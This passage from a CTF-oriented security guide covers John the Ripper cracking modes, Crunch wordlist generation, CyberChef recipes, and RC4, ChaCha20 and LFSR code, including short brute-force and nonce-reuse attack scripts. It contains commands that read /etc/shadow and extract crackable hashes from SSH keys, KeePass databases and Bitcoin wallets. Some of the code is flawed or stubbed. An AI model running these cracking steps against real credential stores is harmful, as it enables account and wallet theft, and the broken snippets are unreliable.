john --incremental=Alnum hashes.txt  # Alphanumeric only
john --incremental=Alpha hashes.txt  # Letters only
john --incremental=Digits hashes.txt # Numbers only

# Custom incremental mode (define in john.conf)
john --incremental=Custom hashes.txt
```

**Single Crack Mode**

```bash
# Uses username/GECOS info for mutations
# Format: username:hash
john --single hashes.txt

# Combines with username-based mutations
# Example: user "admin" tries admin123, Admin, etc.
```

**External Mode (Custom)**

```bash
# Use external.c mode for scripted generation
john --external=MODE hashes.txt

# Requires compilation of custom mode in john.conf
```

#### Hash Format Preparation

**Linux Shadow Files**

```bash
# Use unshadow to combine passwd and shadow
unshadow /etc/passwd /etc/shadow > mypasswd.txt

john mypasswd.txt
```

**Extracting Hashes from Various Sources**

```bash
# SSH keys
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt

# ZIP files
zip2john encrypted.zip > zip_hash.txt
john zip_hash.txt

# RAR archives
rar2john encrypted.rar > rar_hash.txt
john rar_hash.txt

# PDF files
pdf2john encrypted.pdf > pdf_hash.txt
john pdf_hash.txt

# Office documents
office2john document.docx > office_hash.txt
john office_hash.txt

# Keepass databases
keepass2john database.kdbx > keepass_hash.txt
john keepass_hash.txt

# Bitcoin wallet
bitcoin2john wallet.dat > bitcoin_hash.txt
john bitcoin_hash.txt

# PGP/GPG keys
gpg2john private_key.asc > gpg_hash.txt
john gpg_hash.txt
```

#### Rules and Mutations

**Built-in Rules**

```bash
# Common rulesets
--rules=Single      # Single crack mode rules
--rules=Wordlist    # Wordlist mode rules
--rules=Jumbo       # Extended ruleset
--rules=All         # All rules (very slow)

# View specific ruleset
john --list=rules:Wordlist
```

**Custom Rules**

```bash
# Edit john.conf or create custom.conf
# Rule syntax examples:
# c    # Capitalize first letter
# u    # Convert to uppercase
# l    # Convert to lowercase
# r    # Reverse the word
# d    # Duplicate word (password -> passwordpassword)
# $X   # Append character X
# ^X   # Prepend character X
# [    # Remove first character
# ]    # Remove last character

# Example custom rule section in john.conf:
# [List.Rules:CTF]
# c $1 $2 $3
# c $!
# u $2 $0 $2 $0
# l $@ $# $%

# Use custom rules
john --wordlist=wordlist.txt --rules=CTF hashes.txt
```

#### Session Management

```bash
# Restore interrupted session
john --restore

# Save session with name
john --session=ctf_session hashes.txt

# Restore specific session
john --restore=ctf_session
```

#### Performance and Optimization

```bash
# Show progress
john --status

# Fork processes (parallel)
john --fork=4 hashes.txt

# Node distribution (for clusters)
john --node=1/4 hashes.txt  # Process 1 of 4 nodes
```

#### Output Management

```bash
# Show cracked passwords
john --show hashes.txt

# Show with format
john --show --format=raw-md5 hashes.txt

# Pot file location (stores cracked hashes)
cat ~/.john/john.pot

# Custom pot file
john --pot=custom.pot hashes.txt
```

#### CTF-Specific Techniques

**Combining Tools**

```bash
# Use John to generate candidates for Hashcat
john --stdout --wordlist=rockyou.txt --rules=Jumbo | hashcat -m 0 hashes.txt

# Generate mask candidates
john --stdout --mask='?l?l?l?l?d?d?d?d' | head -n 100000
```

**Analyzing Results**

```bash
# Show only usernames and passwords
john --show hashes.txt | cut -d: -f1,2

# Count cracked hashes
john --show hashes.txt | wc -l
```

**Format Testing**

```bash
# Test if format works
john --format=raw-md5 --test

# Benchmark format
john --format=raw-sha256 --test --verbosity=5
```

---

### Crunch - Wordlist Generator

#### Installation

```bash
# Kali Linux (pre-installed)
crunch --version

# Install if needed
apt install crunch
```

#### Basic Syntax

```bash
crunch [min] [max] [charset] -o [output_file]
crunch [min] [max] -t [pattern] -o [output_file]
```

#### Simple Generation

```bash
# Generate 4-8 character lowercase words
crunch 4 8 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# Generate numeric PINs (0000-9999)
crunch 4 4 0123456789 -o pins.txt

# All lowercase 6-character words
crunch 6 6 -o six_char.txt

# Default charset (lowercase a-z)
crunch 5 5 -o default.txt
```

#### Pattern-Based Generation

**Pattern Syntax**

```bash
# Pattern placeholders:
# @ = lowercase letters
# , = uppercase letters
# % = numbers
# ^ = special characters

# Generate: password0000 to password9999
crunch 12 12 -t password%%%% -o pass_num.txt

# Generate: Admin0-Admin9
crunch 6 6 -t Admin% -o admin.txt

# Generate: Pass@000 to Pass@999
crunch 8 8 -t Pass@%%% -o complex.txt

# Mixed pattern: Abc12!
crunch 6 6 -t ,@@%%^ -o mixed.txt
```

#### Custom Character Sets

```bash
# Define custom charset
crunch 8 8 abc123!@# -o custom.txt

# Only vowels and digits
crunch 6 6 aeiou12345 -o vowel_digits.txt

# Hex characters
crunch 8 8 0123456789abcdef -o hex.txt
```

#### Advanced Options

**Limiting Output Size**

```bash
# Limit to 1GB file size
crunch 4 6 -o wordlist.txt -b 1gb

# Split into 100MB chunks
crunch 4 6 -o START -b 100mb
# Creates: aa.txt, ab.txt, ac.txt, etc.

# Limit number of lines
crunch 4 6 -c 1000000 -o wordlist.txt
```

**Resume and Start/End Points**

```bash
# Start from specific word
crunch 4 4 -s aaaa -o wordlist.txt

# End at specific word
crunch 4 4 -e zzzz -o wordlist.txt

# Generate range (aabc to aazz)
crunch 4 4 -s aabc -e aazz -o range.txt
```

**Piping to Other Tools**

```bash
# Pipe directly to hashcat (no file creation)
crunch 6 6 | hashcat -m 0 hashes.txt

# Pipe to John
crunch 4 8 -t pass%%%% | john --stdin hashes.txt

# Compress output
crunch 6 6 | gzip > wordlist.txt.gz
```

#### Character Set Files

```bash
# Use charset from file
crunch 6 6 -f /usr/share/crunch/charset.lst mixalpha -o wordlist.txt

# Available charsets in charset.lst:
# lalpha        = lowercase
# ualpha        = uppercase
# numeric       = 0-9
# symbols14     = common symbols
# mixalpha      = lower + upper
# mixalpha-numeric = letters + numbers

# View available charsets
cat /usr/share/crunch/charset.lst
```

#### Permutation Generation

```bash
# Generate permutations of word
crunch 1 6 -p password admin root
# Output: all permutations of these words

# Permute with duplicates allowed
crunch 3 3 -p abc -d 1
```

#### CTF-Specific Patterns

**Common CTF Formats**

```bash
# Flag format: flag{...}
crunch 10 20 -t flag{@@@@@} -o flags.txt

# Hex-encoded flags: flag{0a1b2c...}
crunch 15 25 -t flag{%%%%%%%%%%%%} -o hex_flags.txt

# Year patterns (2020-2025)
crunch 4 4 -t 202% -o years.txt

# Date format: YYYY-MM-DD
crunch 10 10 -t 202%-01-@@ -o dates.txt

# Hash-like patterns
crunch 32 32 0123456789abcdef -o md5_like.txt
```

**User/Pass Combinations**

```bash
# Username+year (admin2020, admin2021...)
crunch 9 9 -t admin202% -o user_year.txt

# Service defaults (admin123, root123...)
crunch 8 8 -t @@@@%%% -o defaults.txt
```

#### Memory and Performance

```bash
# Calculate wordlist size before generation (no output)
crunch 4 6 -l

# Show progress during generation
crunch 4 8 -v -o wordlist.txt

# Duplicate reduction
crunch 4 6 -d 2  # No more than 2 consecutive identical chars
crunch 4 6 -d 1@ # No consecutive lowercase letters
```

#### Practical Examples

**PIN Generation**

```bash
# 4-digit PINs
crunch 4 4 0123456789 -o pins.txt
# Size: 10,000 combinations

# 6-digit PINs
crunch 6 6 -t %%%%%% -o pins6.txt
# Size: 1,000,000 combinations
```

**Password Variations**

```bash
# Password with leet speak (P@ssw0rd variations)
crunch 8 8 -t P@ssw0rd -o leet.txt
crunch 8 8 -t p@ssw0rd -o leet.txt
crunch 8 8 -t PA55W0RD -o leet.txt

# Common suffix patterns
crunch 11 11 -t password%%% -o pass_suffix.txt
crunch 12 12 -t password%%%% -o pass_suffix2.txt
```

**Key Space Calculation**

```bash
# Formula: charset_size ^ length

# Example: 8-char lowercase (26^8 = 208,827,064,576)
crunch 8 8 -l  # Shows estimated size before generating

# 6-char alphanumeric (62^6 = 56,800,235,584)
crunch 6 6 -f /usr/share/crunch/charset.lst mixalpha-numeric -l
```

#### Combining with Other Tools

**Hashcat Integration**

```bash
# Generate and crack simultaneously
crunch 6 8 | hashcat -m 0 hashes.txt

# Generate specific pattern for mask attack alternative
crunch 8 8 -t @@@@%%%% | hashcat -m 1000 ntlm_hashes.txt
```

**John Integration**

```bash
# Feed crunch output to John
crunch 4 8 -t pass%%%% | john --stdin --format=raw-md5 hashes.txt
```

**Custom Processing**

```bash
# Generate and apply rules with sed
crunch 6 6 | sed 's/$/123/' | hashcat -m 0 hashes.txt

# Generate and filter by pattern
crunch 6 6 | grep '^pass' | john --stdin hashes.txt
```

---

### CyberChef - Web-Based Analysis

#### Accessing CyberChef

```
Web: https://gchq.github.io/CyberChef/
Offline: Download standalone HTML from GitHub
Docker: docker run -p 8080:8080 mpepping/cyberchef
```

#### Interface Components

- **Input Panel**: Raw data entry or file upload
- **Operations Panel**: 300+ operations organized by category
- **Recipe Area**: Drag-and-drop operation chain
- **Output Panel**: Results with multiple view formats
- **Bake Button**: Execute recipe (auto-bake available)

#### Core Cryptography Operations

**Hash Functions**

```
Operations → Hashing
- MD5
- SHA1, SHA2 (224/256/384/512)
- SHA3 (224/256/384/512)
- RIPEMD (128/160/256/320)
- BLAKE2b, BLAKE2s
- Whirlpool
- HMAC (with any hash)
```

**Example Recipe: Multiple Hash Comparison**

```
Input: "flag{test123}"
1. MD5
2. Fork → SHA1, SHA256, SHA512
3. Merge (for comparison)
```

**Encoding/Decoding**

```
Operations → Data Format
- Base64 Encode/Decode
- Base32/16 (Hex)
- URL Encode/Decode
- HTML Entity Encode/Decode
- Unicode Escape/Unescape
- Quoted Printable Decode
- From/To Binary, Octal, Decimal, Hex
```

**Common CTF Recipe: Base64 Chain**

```
Input: "ZmxhZ3t0ZXN0MTIzfQ=="
1. From Base64 (Standard/URL-safe/Filename-safe)
2. [If double-encoded] → From Base64 again
Output: "flag{test123}"
```

#### Classical Ciphers

**Caesar Cipher**

```
Operations → Encryption/Encoding → ROT13/Caesar
- Brute force: Use "ROT13 Brute Force" (tries all 25 shifts)
- Specific shift: Caesar Cipher with custom offset
```

**Substitution Ciphers**

```
- Atbash Cipher (reverse alphabet)
- Vigenère Encode/Decode (requires key)
- Bifid Cipher
- Beaufort Cipher
```

**Example: Vigenère Decode**

```
Input: "LXFOPVEFRNHR"
Operation: Vigenère Decode
Key: "KEY"
Output: "HELLOWORLD"
```

**Transposition Ciphers**

```
- Rail Fence Cipher (varying keys/offsets)
- Columnar Transposition
- Scytale Cipher
```

#### Modern Cryptography

**AES Encryption/Decryption**

```
Operations → Encryption/Encoding → AES Decrypt
Parameters:
- Key format: Hex, UTF8, Latin1, Base64
- IV (Initialization Vector): Hex or UTF8
- Mode: CBC, CFB, CTR, GCM, OFB, ECB
- Key size: 128/192/256 bits
- Padding: PKCS7, ISO/IEC 9797-1, ANSI X.923, ISO 10126, Zero padding

Example:
Input: [ciphertext in hex]
Key: "0123456789abcdef0123456789abcdef" (hex)
IV: "0123456789abcdef0123456789abcdef" (hex)
Mode: CBC
Output: Decrypted plaintext
```

**RSA Operations**

```
Operations → Public Key
- RSA Encrypt/Decrypt
- RSA Sign/Verify
- Parse X.509 certificate
- Parse ASN.1 hex string

[Inference] CyberChef RSA operations require properly formatted PEM keys
```

**XOR Analysis**

```
Operations → Encryption/Encoding
- XOR: Simple XOR with key
- XOR Brute Force: Tests all single-byte keys (0x00-0xFF)
- Multiple XOR: XOR with repeating key

Example: XOR Brute Force
Input: "\x1c\x00\x1f\x1f\x14"
Operation: XOR Brute Force
Result: Key 0x6D → "hello"
```

#### Data Analysis

**Frequency Analysis**

```
Operations → Data → Entropy
Operations → Data → Character Frequency
Operations → Data → Detect File Type

CTF Use: Identify encryption method or find patterns
- High entropy (7.9-8.0) = encrypted/compressed
- Low entropy (<7.0) = plaintext or weak cipher
```

**Magic Operation**

```
Operations → Language → Magic
[Unverified] Automatically detects and applies common operations
- Useful for unknown encoding chains
- Tests Base64, hex, gzip, etc.
- Limited to common patterns

Example:
Input: "%66%6C%61%67%7B%74%65%73%74%7D"
Magic Output: "flag{test}"
```

#### File Operations

**Extract Files**

```
Operations → Compression
- Unzip
- Gunzip
- Bzip2 Decompress
- Untar
- Extract Files (carves files from binary data)

Operations → Multimedia → Extract LSB (Steganography)
```

**File Format Analysis**

```
Operations → File Type
- Detect File Type (magic bytes)
- Scan for Embedded Files
- Parse Unix file permissions
```

#### Useful CTF Recipes

**Multi-Layer Decode**

```
Recipe:
1. From Base64
2. From Hex
3. URL Decode
4. Gunzip

Usage: Detects common CTF encoding layers
```

**Binary to Text**

```
Recipe:
1. From Binary
2. [Fork] → From Hex, From Base64, From Octal
3. Merge

Usage: Try multiple interpretations simultaneously
```

**Hash Identifier**

```
Recipe:
1. Analyse hash (detects hash type by length/format)
2. [No decryption - use external tools]

[Unverified] CyberChef cannot crack hashes, only identify types
```

**JWT Analysis**

```
Operations → Web → JWT Decode
- Decodes JSON Web Token
- Displays header, payload, signature
- Does NOT verify signature (manual verification needed)

Example:
Input: eyJhbGc...[token]
Output: 
Header: {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"user","name":"Admin"}
```

**SQL Hex Decode**

```
Recipe:
1. From Hex (with delimiter: 0x or none)
2. Find/Replace (remove spaces if needed)

Usage: Decode hex-encoded SQL injection payloads
```

#### Advanced Techniques

**Fork and Merge**

```
Fork: Split input into parallel processing paths
Merge: Combine results from multiple operations

Example: Test Multiple Ciphers
1. Fork
   Path A: Caesar Cipher (shift 3)
   Path B: ROT13
   Path C: Atbash
2. Merge
3. Compare outputs
```

**Subsection Operation**

```
Operations → Flow Control → Subsection
- Process only specific part of input
- Useful for extracting specific fields or blocks
```

**Regular Expressions**

```
Operations → Regex → Regular expression
- Extract patterns from text
- Common patterns: flags, emails, IPs, hashes

Example: Extract flag
Pattern: flag\{[^\}]+\}
Input: "Some text flag{secret123} more text"
Output: "flag{secret123}"
```

#### Data Representation

**From/To Hexdump**

```
Operations → Data Format
- To Hexdump (multiple formats: standard, xxd, etc.)
- From Hexdump (auto-detects format)

CTF Use: Convert between raw binary and readable hex
```

**Character Encoding**

```
Operations → Data Format
- Decode text (auto-detect charset)
- Encode text (specify charset)
- UTF-8/16/32, ASCII, Latin1, Windows-1252, etc.

CTF Use: Fix mojibake or handle non-ASCII encodings
```

#### Practical Workflow

**Unknown CTF Challenge Approach**

```
1. Detect File Type (check magic bytes)
2. Magic (auto-decode common formats)
3. [If text] → Entropy (check randomness)
4. [If encoded] → Try Base64/Hex decode
5. [If still encoded] → Try XOR Brute Force
6. [If cipher] → Frequency analysis
7. [If compressed] → Gunzip/Unzip
```

**Steganography Analysis**

```
1. Extract LSB (Least Significant Bit)
2. [If image] → View as hex dump
3. Scan for Embedded Files
4. Strings extraction (manual inspection)
```

**API and Automation** [Inference] CyberChef provides URL-based recipe sharing:

```
Format: https://gchq.github.io/CyberChef/#recipe=<operations>
Example: #recipe=From_Base64('A-Za-z0-9%2B/%3D',true)
```

[Unverified] Recipe URLs allow sharing analysis workflows between team members

---

**Important Related Topics:**

- Hash collision attacks and length extension attacks
- Dictionary generation strategies and password statistics
- Cryptanalysis fundamentals (frequency analysis, known-plaintext attacks)
- Side-channel attacks against implemented cryptography
- CTF challenge reconnaissance and cipher identification techniques

---

# MODERN SYMMETRIC CRYPTOGRAPHY

## Stream Ciphers

### RC4 (Rivest Cipher 4)

RC4 is a symmetric stream cipher that generates a pseudo-random keystream by maintaining an internal state array and performing byte-level manipulations. Despite being cryptographically broken for most modern applications, it remains a CTF target due to implementation flaws and educational value.

#### Cipher Mechanics

RC4 consists of two phases:

**Key Scheduling Algorithm (KSA):**

Initializes a 256-byte state array and processes the key:

```python
def ksa(key):
    """RC4 Key Scheduling Algorithm"""
    S = list(range(256))
    j = 0
    
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    return S

# Example
key = b"SECRET"
state = ksa(key)
print(state[:10])  # First 10 bytes of initialized state
```

**Pseudo-Random Generation Algorithm (PRGA):**

Generates keystream bytes from the initialized state:

```python
def prga(state, length):
    """RC4 Pseudo-Random Generation Algorithm"""
    S = state.copy()
    i = 0
    j = 0
    keystream = []
    
    for _ in range(length):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        keystream.append(K)
    
    return keystream, S

# Generate keystream
keystream, _ = prga(state, 10)
print([hex(byte) for byte in keystream])
```

**Complete RC4 Encryption:**

```python
def rc4(key, data):
    """RC4 encryption (same as decryption due to XOR symmetry)"""
    state = ksa(key)
    keystream, _ = prga(state, len(data))
    return bytes(byte ^ key_byte for byte, key_byte in zip(data, keystream))

plaintext = b"Hello World"
key = b"SECRET"
ciphertext = rc4(key, plaintext)
print(f"Ciphertext: {ciphertext.hex()}")
print(f"Decrypted: {rc4(key, ciphertext)}")
```

#### Weaknesses and Attacks

**Biases in Keystream:**

RC4's PRGA produces biased output, particularly in initial bytes. The first byte has higher probability of being 0, and certain byte pairs appear more frequently than random.

```python
def detect_rc4_bias(ciphertexts, key_length):
    """
    Analyze RC4 ciphertexts for statistical biases
    [Inference] - Requires multiple ciphertexts encrypted with same key
    """
    byte_frequencies = [[0 for _ in range(256)] for _ in range(key_length)]
    
    for ciphertext in ciphertexts:
        for position, byte in enumerate(ciphertext):
            byte_frequencies[position % key_length][byte] += 1
    
    print("Byte frequency deviations from uniformity:")
    for position in range(min(3, key_length)):  # Check first 3 positions
        max_freq = max(byte_frequencies[position])
        uniform_freq = len(ciphertexts) / 256
        deviation = (max_freq - uniform_freq) / uniform_freq * 100
        print(f"Position {position}: {deviation:.2f}% bias detected")
```

**Fluhrer, Mantin, and Shamir (FMS) Attack:**

[Unverified] The FMS attack exploits weak key schedules in RC4 when used with WEP. It requires packets with known initialization vectors and can recover the key incrementally.

**Related-Key Attack:**

If you have ciphertexts encrypted with related keys, analysis of keystream patterns can reveal the key.

```python
def compare_keystreams(key1, key2, length):
    """
    Compare keystreams from related keys to detect patterns
    [Inference] - Effectiveness depends on key relationship
    """
    state1 = ksa(key1)
    state2 = ksa(key2)
    
    keystream1, _ = prga(state1, length)
    keystream2, _ = prga(state2, length)
    
    differences = sum(1 for a, b in zip(keystream1, keystream2) if a != b)
    print(f"Keystream differences: {differences}/{length}")
    print(f"Correlation: {(1 - differences/length) * 100:.2f}%")

key1 = b"KEY1"
key2 = b"KEY2"
compare_keystreams(key1, key2, 256)
```

**Brute-Force Short Keys:**

Short RC4 keys (< 10 bytes) are susceptible to brute-force attacks:

```python
def brute_force_rc4(ciphertext, max_key_length=8, wordlist=None):
    """
    Brute-force RC4 key from ciphertext
    Assumes known plaintext prefix (common in CTF)
    """
    known_plaintext = b"FLAG{"
    
    if wordlist:
        with open(wordlist, 'r') as f:
            candidates = f.read().split('\n')
    else:
        # Generate all possible keys up to max_key_length
        from itertools import product
        candidates = []
        for length in range(1, max_key_length + 1):
            for combo in product(range(256), repeat=length):
                candidates.append(bytes(combo))
    
    for key_candidate in candidates:
        try:
            # Decrypt first bytes
            decrypted = rc4(key_candidate, ciphertext[:len(known_plaintext)])
            if decrypted == known_plaintext:
                print(f"Key found: {key_candidate}")
                # Verify with full decryption
                full_plaintext = rc4(key_candidate, ciphertext)
                print(f"Plaintext: {full_plaintext}")
                return key_candidate
        except:
            pass
    
    print("Key not found")
    return None
```

#### RC4 in CTF Contexts

RC4 appears in CTF challenges when:

- Implementing a "secure" messaging system with weak cryptography.
- Analyzing WEP/WPA vulnerabilities.
- Demonstrating stream cipher biases and attacks.

**Common CTF Scenario:**

```bash
# Given: ciphertext.bin (RC4-encrypted) and hint: key is 4-character string
python3 << 'EOF'
import itertools

ciphertext = open('ciphertext.bin', 'rb').read()
known_plain = b"flag"

# Brute-force 4-character ASCII keys
for key_tuple in itertools.product(range(32, 127), repeat=4):
    key = bytes(key_tuple)
    state = ksa(key)
    keystream, _ = prga(state, len(ciphertext))
    decrypted = bytes(c ^ k for c, k in zip(ciphertext, keystream))
    
    if decrypted.startswith(known_plain):
        print(f"Key: {key}")
        print(f"Plaintext: {decrypted}")
        break
EOF
```

#### Tools for RC4

**`openssl enc` (legacy support):**

```bash
# Note: OpenSSL has deprecated RC4 for security reasons
openssl enc -rc4 -d -K $(echo -n "SECRET" | od -A n -t x1 | tr -d ' ') -in ciphertext.bin -out plaintext.txt 2>/dev/null
```

**Python with `cryptography` library:**

```bash
pip install cryptography

python3 << 'EOF'
from cryptography.hazmat.primitives.ciphers.algorithms import ARC4
from cryptography.hazmat.backends import default_backend

key = b"SECRET"
cipher = ARC4(key)
encryptor = cipher.encryptor()
plaintext = b"Hello World"
ciphertext = encryptor.update(plaintext)

decryptor = cipher.decryptor()
decrypted = decryptor.update(ciphertext)
print(decrypted)
EOF
```

**`radamsa` for fuzzing RC4 implementations:**

```bash
echo "plaintext" | radamsa | ./rc4_program
```

---

### ChaCha20

ChaCha20 is a modern stream cipher designed by Daniel Bernstein as an alternative to RC4 with better performance and security properties. It uses a 256-bit key and produces a 512-bit block of keystream.

#### Cipher Mechanics

ChaCha20 operates on a 4×4 matrix of 32-bit words representing internal state:

```
Column state:  Row state:
[0][1][2][3]   [0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15]

Constant: "expand 32-byte k"
Key: 32 bytes (8 words)
Nonce: 12 bytes (3 words)
Counter: 4 bytes (1 word)
```

**ChaCha20 Initialization:**

```python
def chacha20_init(key, nonce, counter=0):
    """
    Initialize ChaCha20 state
    key: 32 bytes
    nonce: 12 bytes
    counter: 32-bit integer
    """
    import struct
    
    # Constants (little-endian)
    state = [
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,  # "expand 32-byte k"
        struct.unpack('<I', key[0:4])[0],
        struct.unpack('<I', key[4:8])[0],
        struct.unpack('<I', key[8:12])[0],
        struct.unpack('<I', key[12:16])[0],
        struct.unpack('<I', key[16:20])[0],
        struct.unpack('<I', key[20:24])[0],
        struct.unpack('<I', key[24:28])[0],
        struct.unpack('<I', key[28:32])[0],
        counter,
        struct.unpack('<I', nonce[0:4])[0],
        struct.unpack('<I', nonce[4:8])[0],
        struct.unpack('<I', nonce[8:12])[0],
    ]
    return state
```

**ChaCha20 Quarter Round:**

The core operation mixes four 32-bit words:

```python
def quarter_round(state, a, b, c, d):
    """Perform one ChaCha20 quarter round"""
    def rotl(x, n):
        return ((x << n) | (x >> (32 - n))) & 0xffffffff
    
    def add_mod(*args):
        return sum(args) & 0xffffffff
    
    state[a] = add_mod(state[a], state[b])
    state[d] ^= state[a]
    state[d] = rotl(state[d], 16)
    
    state[c] = add_mod(state[c], state[d])
    state[b] ^= state[c]
    state[b] = rotl(state[b], 12)
    
    state[a] = add_mod(state[a], state[b])
    state[d] ^= state[a]
    state[d] = rotl(state[d], 8)
    
    state[c] = add_mod(state[c], state[d])
    state[b] ^= state[c]
    state[b] = rotl(state[b], 7)
```

**Complete ChaCha20 Round:**

```python
def chacha20_rounds(state, rounds=20):
    """Perform ChaCha20 rounds (typically 20)"""
    working_state = state.copy()
    
    for _ in range(rounds // 2):
        # Column rounds
        quarter_round(working_state, 0, 4, 8, 12)
        quarter_round(working_state, 1, 5, 9, 13)
        quarter_round(working_state, 2, 6, 10, 14)
        quarter_round(working_state, 3, 7, 11, 15)
        
        # Diagonal rounds
        quarter_round(working_state, 0, 5, 10, 15)
        quarter_round(working_state, 1, 6, 11, 12)
        quarter_round(working_state, 2, 7, 8, 13)
        quarter_round(working_state, 3, 4, 9, 14)
    
    return [(working_state[i] + state[i]) & 0xffffffff for i in range(16)]
```

**Keystream Generation and Encryption:**

```python
def chacha20_encrypt(key, nonce, plaintext, counter=0):
    """Complete ChaCha20 encryption"""
    import struct
    
    ciphertext = b""
    counter_val = counter
    position = 0
    
    while position < len(plaintext):
        state = chacha20_init(key, nonce, counter_val)
        keystream_block = chacha20_rounds(state)
        
        # Convert state to bytes (little-endian)
        keystream_bytes = b"".join(struct.pack('<I', word) for word in keystream_block)
        
        # XOR plaintext with keystream
        for i in range(min(64, len(plaintext) - position)):
            ciphertext += bytes([plaintext[position + i] ^ keystream_bytes[i]])
        
        position += 64
        counter_val += 1
    
    return ciphertext

# Example
key = b"0" * 32  # 32-byte key
nonce = b"0" * 12  # 12-byte nonce
plaintext = b"Hello World! This is a test of ChaCha20."
ciphertext = chacha20_encrypt(key, nonce, plaintext)
decrypted = chacha20_encrypt(key, nonce, ciphertext)
print(f"Decrypted: {decrypted}")
```

#### ChaCha20-Poly1305 Authenticated Encryption

ChaCha20 is often combined with Poly1305 for authenticated encryption (AEAD):

```python
def poly1305_mac(key, message):
    """
    Poly1305 MAC computation
    [Unverified] - Simplified version; full implementation is complex
    """
    # Poly1305 uses a 32-byte key
    # MAC computation involves modular arithmetic over GF(2^130-5)
    print("[Note: Full Poly1305 requires detailed modular arithmetic]")
    # Placeholder for educational purposes
    return b""
```

#### Attacks on ChaCha20

**Known-Plaintext Attack:**

If both plaintext and ciphertext are known, the keystream can be recovered directly via XOR:

```python
def recover_keystream(plaintext, ciphertext):
    """Recover keystream from known plaintext"""
    keystream = bytes(p ^ c for p, c in zip(plaintext, ciphertext))
    return keystream

# If plaintext starts with "flag{"
plaintext_prefix = b"flag{"
ciphertext_prefix = b"\x0f\x1a\x0c\x0e\x02"  # Hypothetical

keystream = recover_keystream(plaintext_prefix, ciphertext_prefix)
print(f"Recovered keystream: {keystream.hex()}")
```

**Nonce Reuse Attack:**

If the same (key, nonce) pair is used to encrypt multiple messages, keystreams can be recovered and plaintexts XORed to recover information:

```python
def nonce_reuse_attack(ciphertext1, ciphertext2):
    """
    Recover plaintext if same key/nonce are used for two messages
    c1 XOR c2 = m1 XOR m2 (keystream cancels)
    """
    xored = bytes(c1 ^ c2 for c1, c2 in zip(ciphertext1, ciphertext2))
    print(f"c1 XOR c2: {xored.hex()}")
    print("[Analyze XORed plaintext patterns to recover individual messages]")
    return xored

# Given two ciphertexts encrypted with same key/nonce
c1 = b"encrypted1"
c2 = b"encrypted2"
nonce_reuse_attack(c1, c2)
```

**Weak Nonce Generation:**

If nonces are predictable or reused, the cipher is broken. Monitor nonce randomness.

#### ChaCha20 in CTF

ChaCha20 appears in CTF challenges involving:

- Modern cryptographic systems.
- AEAD authentication bypass scenarios.
- Nonce reuse demonstrations.

**Common CTF Pattern:**

```bash
# Challenge: Decrypt message encrypted with ChaCha20, given key and multiple ciphertexts with nonce reuse

python3 << 'EOF'
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.backends import default_backend
import os

# Attacker's perspective
key = os.urandom(32)  # Assume known or brute-forced
nonce = os.urandom(12)

# Challenge provides multiple ciphertexts with same nonce (vulnerable!)
# c1 XOR c2 = m1 XOR m2 if same key/nonce

# Recovery strategy: Known plaintext + nonce reuse
cipher_known = ChaCha20Poly1305(key)
ciphertext_known = cipher_known.encrypt(nonce, b"known_message", None)
ciphertext_unknown = open('ciphertext.bin', 'rb').read()

xored = bytes(a ^ b for a, b in zip(ciphertext_known, ciphertext_unknown[:len(ciphertext_known)]))
print(f"XORed result: {xored}")
EOF
```

#### Tools for ChaCha20

**`cryptography` library:**

```bash
python3 << 'EOF'
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.backends import default_backend
import os

key = os.urandom(32)
nonce = os.urandom(12)

cipher = ChaCha20Poly1305(key)
plaintext = b"Secret message"
ciphertext = cipher.encrypt(nonce, plaintext, None)
decrypted = cipher.decrypt(nonce, ciphertext, None)
print(decrypted)
EOF
```

**`openssl` (version 1.1.1+):**

```bash
# Encrypt with ChaCha20-Poly1305
openssl enc -chacha20 -K $(echo -n "key_hex_here" | xxd -p) -iv $(echo -n "nonce_hex" | xxd -p) -in plaintext.txt -out ciphertext.bin

# Decrypt
openssl enc -d -chacha20 -K $(echo -n "key_hex_here" | xxd -p) -iv $(echo -n "nonce_hex" | xxd -p) -in ciphertext.bin
```

---

### Linear Feedback Shift Registers (LFSR)

An LFSR is a shift register whose input bit is a linear function (typically XOR) of its previous state. LFSRs generate pseudo-random sequences and are fundamental components in stream ciphers and error-correcting codes.

#### LFSR Mechanics

An LFSR consists of:

- A register holding `n` bits of state.
- Feedback taps at specific bit positions.
- XOR operation on tap positions to compute new input bit.

**Example: 4-bit LFSR with taps at positions 4 and 3**

```
State:  [b3 b2 b1 b0]
Taps:   positions 3 and 0
Feedback: b3 XOR b0
New state: [feedback, b3, b2, b1]
```

**Python Implementation:**

```python
def lfsr_step(state, taps):
    """
    Advance LFSR by one step
    state: integer or list representing bits
    taps: list of bit positions to XOR (0-indexed from right)
    """
    if isinstance(state, int):
        # Convert int to bit list
        bit_list = [(state >> i) & 1 for i in range(state.bit_length())]
    else:
        bit_list = state.copy()
    
    # Compute feedback from taps
    feedback = 0
    for tap in taps:
        if tap < len(bit_list):
            feedback ^= bit_list[tap]
    
    # Shift left and insert feedback
    new_state = [feedback] + bit_list[:-1]
    
    # Return as integer
    result = 0
    for i, bit in enumerate(new_state):
        result |= (bit << i)
    
    return result

# Example: 4-bit LFSR with taps [3, 0]
state = 0b1001  # Initial state: 1001
taps = [3, 0]

print(f"Initial: {bin(state)}")
for step in range(10):
    state = lfsr_step(state, taps)
    print(f"Step {step + 1}: {bin(state)}")
```

**Galois Configuration (more common in CTF):**

```python
def lfsr_galois(state, polynomial, steps=1):
    """
    Galois LFSR implementation (often more efficient)
    state: integer representing register state
    polynomial: integer where bits indicate feedback taps
    """
    for _ in range(steps):
        lsb = state & 1
        state >>= 1
        if lsb:
            state ^= polynomial
    return state

# Example: 8-bit Galois LFSR with polynomial 0xB8 (10111000)
state = 0x01
poly = 0xB8

for i in range(20):
    state = lfsr_galois(state, poly)
    print(f"Step {i}: {bin(state)} ({state})")
```

#### LFSR Cryptanalysis

**Berlekamp-Massey Algorithm:**

[Inference] Given a sequence of LFSR output bits, the Berlekamp-Massey algorithm finds the minimal polynomial (tap configuration) in O(n²) time.

```python
def berlekamp_massey(sequence):
    """
